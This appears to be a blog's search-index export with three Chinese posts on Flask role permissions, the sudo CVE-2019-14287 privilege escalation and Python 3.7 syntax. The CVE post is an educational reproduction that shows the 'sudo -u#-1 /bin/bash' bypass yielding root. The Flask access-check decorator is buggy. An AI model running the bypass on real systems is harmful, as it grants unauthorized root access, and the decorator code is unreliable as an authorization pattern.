<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Flask角色权限控制</title>
      <link href="/2019/11/18/flask-jiao-se-quan-xian-kong-zhi/"/>
      <url>/2019/11/18/flask-jiao-se-quan-xian-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask角色权限控制"><a href="#Flask角色权限控制" class="headerlink" title="Flask角色权限控制"></a>Flask角色权限控制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前flask的组件并不能完美的解决角色权限控制问题。大部分组件都是check是否登录，每次请求检查session？</p><p>这并不是我想要的啊！我很喜欢前后端分离的理念，我不喜欢使用Python 模板语言，我觉得很臃肿。前端我还是很推荐使用vue，react等。后端很推荐REST架构设计，这样感觉思路清晰很多。</p><h2 id="为啥选择Flask"><a href="#为啥选择Flask" class="headerlink" title="为啥选择Flask"></a>为啥选择Flask</h2><p>我只能用简单易用来形容这个框架。Django = Flask + 插件</p><p>Django对于熟悉整个框架的人来说还是很方便的，因为他超多功能已经内置了，不需要像Flask装各种插件来满足自己的使用。但是Flask学习成本比较低不需要去学习一个庞大的系统。</p><h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><blockquote><p>认证方式：Basic Auth，Token，OAuth等</p></blockquote><p><strong>Basic Auth：</strong></p><p>​        通过用户名密码来验证，会不会太麻烦了，针对每个资源都要被要求认证（每次都要输入账号密码），我是脑子瓦特了？这时候有人会说我可以用session，cookie来维持会话啊，这样登录一次不就好了。这个已经涉及到另一种认证方式了。</p><p>​        客户端将输入的用户名密码用Base64进行编码后，采用非加密的明文方式传送给服务器。但是这种方式是比较可逆的。数据易抓取导致账号被盗取利用。**</p><p><strong>Token Auth：</strong></p><p>​        当你登录成功，服务端将会返回一个Token给你，当你每次请求时Header头携带Token进行资源请求验证，在这个过程已经不再涉及用户名密码，session，cookie了，做到无状态请求。且支持跨域访问等。</p><p>​        我个人还是很推荐使用Token认证的，而且我觉得也是简单方便。</p><p><strong>OAuth：</strong></p><p>​        这个认证一般第三方认证用的会比较多，你只需要用同一个账号密码，就能在各个网站进行访问，而免去了在每个网站都进行注册的繁琐过程。 </p><p>​        这个在公司内网采用的最为  ，只需要认证一次就可以请求公司内网的各种资源。</p><p>我谈及的并不深入，只是个人的看法和认知，想要更加深入各位大佬可以寻找文章进行学习。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="https://image.kalifun.top/upload/1908/76c35ea76c5d0b6f.png" alt></p><p>这个是大概的一个描述，接下我将讲一下我是如何实现角色权限控制的。</p><h2 id="角色权限控制"><a href="#角色权限控制" class="headerlink" title="角色权限控制"></a>角色权限控制</h2><blockquote><p>这个并没有正对单个权限进行验证,这个也是不足地方。</p></blockquote><p>假设我们有普通户，管理员，超级管理员。我们对每个接口进行验证角色是否有请求权限。</p><h3 id="装饰器functools"><a href="#装饰器functools" class="headerlink" title="装饰器functools"></a>装饰器functools</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from functools import wraps</span><br><span class="line">def Authen(rolename):</span><br><span class="line">def check(func):</span><br><span class="line">@wraps(func)</span><br><span class="line">        def checkrole(*args,**kwargs):</span><br><span class="line">            if &quot;admin&quot; in rolename:</span><br><span class="line">                func(*args,**kwargs)</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br><span class="line">    return checkrole</span><br><span class="line">    return check</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import Authen</span><br><span class="line"></span><br><span class="line">@Authen([&quot;admin&quot;])</span><br><span class="line">def index():</span><br><span class="line">print(&quot;admin 存在&quot;)</span><br><span class="line"></span><br><span class="line">@Authen([&apos;user&apos;])</span><br><span class="line">def index():</span><br><span class="line">print(&quot;admin 不存在&quot;)</span><br></pre></td></tr></table></figure></div><p>这个示例不知道是否能想到我的做法呢？</p><p>利用装饰器来充当我们的拦截器，当每次路由访问的时候进行角色判断。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@admin_api.route(&apos;/deluser&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">@cross_origin()</span><br><span class="line">@Authentication([&quot;admin&quot;])</span><br><span class="line">def deleteuser():</span><br><span class="line">    username = request.json.get(&quot;username&quot;)</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        user = User.query_filter_by(username = username).first()</span><br><span class="line">        if user.role_id == 3:</span><br><span class="line">            user.deluser()</span><br><span class="line">            return jsonify(&#123;&quot;message&quot;:&quot;删除成功&quot;&#125;)</span><br><span class="line">        else:</span><br><span class="line">            return jsonify(&#123;&quot;message&quot;:&quot;删除失败&quot;&#125;),403</span><br></pre></td></tr></table></figure></div><p>拦截器我就不举例了，因为和上面示例差不多，到时候我再出一篇Token生成，ToKen验证，角色控制结合在一起的文章，也许这样更能理解。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14287提权漏洞</title>
      <link href="/2019/10/16/cve-2019-14287/"/>
      <url>/2019/10/16/cve-2019-14287/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-14287提权漏洞"><a href="#CVE-2019-14287提权漏洞" class="headerlink" title="CVE-2019-14287提权漏洞"></a>CVE-2019-14287提权漏洞</h1><p><em>sudo</em>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>这个漏洞比较鸡肋，并不是sudo版本低就可以让你能够提权，需要满足一定条件才能触发这个漏洞。</p><h2 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h2><p>Linux默认是没有将用户添加到sudoers列表中的，需要root手动将账户添加到sudoers列表中，才能让普通账户执行sudo命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>sudo &lt; 1.8.28</p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>在服务多的情况下，管理员会将一些普通用户添加到sudoers列表中，这也是我们触发漏洞的关键。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># username  ALL=(ALL,!root) ALL</span><br></pre></td></tr></table></figure></div><ul><li>username表示添加的用户名</li><li>第一个ALL表示允许该用户在任意机器或者终端中使用sudo</li><li>括号里面的（ALL,!root）表示命令可以被除了root以外的任意用户身份去执行</li><li>最后一个ALL表示被允许执行的命令</li></ul><p>修改/etc/sudoers文件，kalifun用户不能以root用户执行/bin/bash命令。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kalifun ALL=(ALL,!root) /bin/bash</span><br></pre></td></tr></table></figure></div><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>1.切换kalifun用户</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#su kalifun</span><br><span class="line">#whoami</span><br><span class="line">#kalifun</span><br></pre></td></tr></table></figure></div><p>2.执行/bin/bash</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#sudo /bin/bash</span><br><span class="line">Sorry, user kalifun is not allowed to execute &apos;/bin/bash&apos; as root on xxxxxxxx.</span><br></pre></td></tr></table></figure></div><p>你会发现你无法执行bash命令。现在我们进行提权操作。</p><p>3.提权</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#sudo -u#-1 /bin/bash</span><br><span class="line">bash-4.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></div><p>现在你就变成root权限了。</p><p><img src="https://image.kalifun.top/upload/1910/d32109e04df264b4.png" alt></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户可以通过命令行上的 –u#-1 绕过这个非 root限制。如果将 sudo配置为允许用户通过Runas 规范中的 ALL 关键字以任意用户身份运行命令，则可以通过指定用户 ID为-1 或4294967295 以 root 用户身份运行命令。只要Runas 规范中最先列出 ALL 关键字，即使Runas 规范明确禁止 root访问权限，那么具有足够的 sudo 权限的而用户即可以 root 身份运行命令。以这种方式运行的命令的日志条目会把目标用户列为 4294967295而非 root。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>手动升级sudo版本。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/news/216821.html" target="_blank" rel="noopener">Linux Sudo被曝漏洞，可导致用户以root权限运行命令</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3.7 の 基础语法</title>
      <link href="/2019/06/19/python3-ji-chu-yu-fa/"/>
      <url>/2019/06/19/python3-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3-7-の-基础语法"><a href="#Python3-7-の-基础语法" class="headerlink" title="Python3.7 の 基础语法"></a>Python3.7 の 基础语法</h1><blockquote><p>之前一直是使用python2.7，也没有去尝试使用3的版本。今天看到python2.7将维护到2020年。因此打算把3.7基础过一遍。</p></blockquote><p><strong>我将会记录我印象中和2.7不同的。我2.7基础也不是很好，所以有的内容也可能会重复。</strong></p><hr><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p><strong>python2.7</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure></div><p><strong>python3.7</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> (<span class="string">"Hello World"</span>)</span><br><span class="line">这个应该算是<span class="number">3</span>的特性，并不是指<span class="number">3.7</span>衍生出来的。</span><br></pre></td></tr></table></figure></div><hr><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><strong>三重引号： “”“ ……”“”，‘’‘ …… ’‘’。字符串中的回车换行会自动包含到字符串中，如果不想包含，在行尾加入一个\即可。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"""\</span></span><br><span class="line"><span class="string">Usage: thingy [OPTIONS]</span></span><br><span class="line"><span class="string">     -h                        Display this usage message</span></span><br><span class="line"><span class="string">     -H hostname               Hostname to connect to</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python 1.py</span><br><span class="line">Usage: thingy [OPTIONS]</span><br><span class="line">     -h                        Display this usage message</span><br><span class="line">     -H hostname               Hostname to connect to</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"""</span></span><br><span class="line"><span class="string">Usage: thingy [OPTIONS]</span></span><br><span class="line"><span class="string">     -h                        Display this usage message</span></span><br><span class="line"><span class="string">     -H hostname               Hostname to connect to</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python 1.py</span><br><span class="line"></span><br><span class="line">Usage: thingy [OPTIONS]</span><br><span class="line">     -h                        Display this usage message</span><br><span class="line">     -H hostname               Hostname to connect to</span><br></pre></td></tr></table></figure></div><p><strong>相邻的两个或者多个字符串字面值将会自动连接。这个特性我不知道2.7是否有。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'p'</span> <span class="string">'y'</span> <span class="string">'thon'</span></span><br><span class="line"><span class="string">'python'</span></span><br></pre></td></tr></table></figure></div><p><strong>索引，我记得2.7就有这个特性。但是貌似我使用的不多。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>n = <span class="string">"python"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n[<span class="number">1</span>]</span><br><span class="line"><span class="string">'y'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n[<span class="number">-1</span>]</span><br><span class="line"><span class="string">'n'</span></span><br></pre></td></tr></table></figure></div><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><strong>列表可以进行拼接</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + [<span class="number">2</span>,<span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure></div><p><strong>append()方法添加新元素</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">5</span>*<span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">30</span>]</span><br></pre></td></tr></table></figure></div><p><strong>嵌套列表，这个在数据处理上就方便很多啦。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">30</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">"a"</span>,<span class="string">"b"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = [a,b]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">[[<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">30</span>], [<span class="string">'a'</span>, <span class="string">'b'</span>]]</span><br></pre></td></tr></table></figure></div><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><h4 id="args-和-kwargs"><a href="#args-和-kwargs" class="headerlink" title="args 和 *kwargs"></a><em>args 和 *</em>kwargs</h4><p>首先我们需要关注在这个*上面，其实你可以理解它是有两部分的。</p><ul><li>打包</li><li>拆包</li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">argument</span><span class="params">(*arg)</span>:</span></span><br><span class="line">    print(arg)</span><br><span class="line">    print(type(arg))</span><br><span class="line"></span><br><span class="line">argument(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">56</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python arg.py</span><br><span class="line">(1, 2, 3, 4, 56)</span><br><span class="line">&lt;class <span class="string">'tuple'</span>&gt;</span><br></pre></td></tr></table></figure></div><p>∗把函数argument接受到的多个参数1,2,3,4,56，打包成了元组(1,2,3,4,56)，赋值给了形参arg。</p><p>根据上面我们就更好理解**kwargs了。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keywords</span><span class="params">(**kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> kwargs:</span><br><span class="line">        print(kw,kwargs[kw])</span><br><span class="line">    print(type(kwargs))</span><br><span class="line"></span><br><span class="line">keywords(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python kwargs.py</span><br><span class="line">a 1</span><br><span class="line">b 2</span><br><span class="line">c 3</span><br><span class="line">&lt;class <span class="string">'dict'</span>&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keywords</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">    print(a,b,c)</span><br><span class="line">keywords(**&#123;<span class="string">"a"</span>:<span class="number">1</span>,<span class="string">"b"</span>:<span class="number">2</span>,<span class="string">"c"</span>:<span class="number">3</span>&#125;)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python kwargs.py</span><br><span class="line">1 2 3</span><br></pre></td></tr></table></figure></div><p><strong>这样就是把字典拆分赋值给形参了。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheeseshop</span><span class="params">(kind,*argument,**keywords)</span>:</span></span><br><span class="line">    print(<span class="string">"-- Do you have any"</span>, kind, <span class="string">"?"</span>)</span><br><span class="line">    print(<span class="string">"-- I'm sorry, we're all out of"</span>, kind)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> argument:</span><br><span class="line">        print(arg)</span><br><span class="line">    print(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> keywords:</span><br><span class="line">        print(kw,<span class="string">":"</span>,keywords[kw])</span><br><span class="line"></span><br><span class="line">cheeseshop(<span class="string">"Limburger"</span>, <span class="string">"It's very runny, sir."</span>,</span><br><span class="line">           <span class="string">"It's really very, VERY runny, sir."</span>,</span><br><span class="line">           shopkeeper=<span class="string">"Michael Palin"</span>,</span><br><span class="line">           client=<span class="string">"John Cleese"</span>,</span><br><span class="line">           sketch=<span class="string">"Cheese Shop Sketch"</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python moreval.py</span><br><span class="line">-- Do you have any Limburger ?</span><br><span class="line">-- I<span class="string">'m sorry, we'</span>re all out of Limburger</span><br><span class="line">It<span class="string">'s very runny, sir.</span></span><br><span class="line"><span class="string">It'</span>s really very, VERY runny, sir.</span><br><span class="line">----------------------------------------</span><br><span class="line">shopkeeper : Michael Palin</span><br><span class="line">client : John Cleese</span><br><span class="line">sketch : Cheese Shop Sketch</span><br></pre></td></tr></table></figure></div><h3 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h3><p><strong>可以用lambda关键字来创建一个小的匿名函数。Lambda函数可以在需要的函数对象的任何地方使用。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add = <span class="keyword">lambda</span> x,y : x+y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></div><h4 id="应用在函数式编程中"><a href="#应用在函数式编程中" class="headerlink" title="应用在函数式编程中"></a>应用在函数式编程中</h4><p><strong>按照绝对值进行排序</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list = [<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">-1</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(list,key=<span class="keyword">lambda</span> x: abs(x))</span><br><span class="line">[<span class="number">1</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure></div><h4 id="应用在闭包中"><a href="#应用在闭包中" class="headerlink" title="应用在闭包中"></a>应用在闭包中</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_y</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">lambda</span> x: a+b</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y1 = get_y(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y1</span><br><span class="line">&lt;function get_y.&lt;locals&gt;.&lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x02DB80C0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y1(<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y1(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure></div><h3 id="函数标注"><a href="#函数标注" class="headerlink" title="函数标注"></a>函数标注</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">label</span><span class="params">(ham: str,eggs: str = <span class="string">'eggs'</span>)</span> -&gt; 